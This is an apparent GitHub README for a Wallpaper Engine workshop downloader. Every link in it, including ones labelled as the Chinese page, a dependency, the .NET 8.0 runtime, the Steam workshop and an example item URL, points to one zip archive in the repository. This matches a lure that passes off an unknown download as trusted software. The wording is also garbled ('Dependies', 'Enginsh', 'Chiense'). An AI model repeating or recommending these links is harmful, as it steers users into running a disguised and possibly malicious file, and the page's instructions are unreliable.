# Wallpaper Engine Workshop Downloader

[中文](https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip)

A workshop download tool for Wallpaper Engine.

## Functions  

* Automatically the workshop item for Wallpaper Engine without your own Steam account.

## Dependies  

* <https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip>

## Usage  

 * Please install [.NET 8.0 Runtime](https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip) first.

 1. Browse the workshop item you like in <https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip>

 2. Copy the URL of the workshop item you like. For example, `https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip`

 3. Run `https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip` (Enginsh) or `https://github.com/Z1ted/WallpaperEngineWorkshopDownloader/raw/refs/heads/main/pleaser/Downloader-Wallpaper-Workshop-Engine-v1.3-alpha.2.zip` (Chiense) and paste the workshop item URL into item box.

 4. Select the wallpaper engine file path (with folder `\projects\myprojects` included) and click the `Download` button.
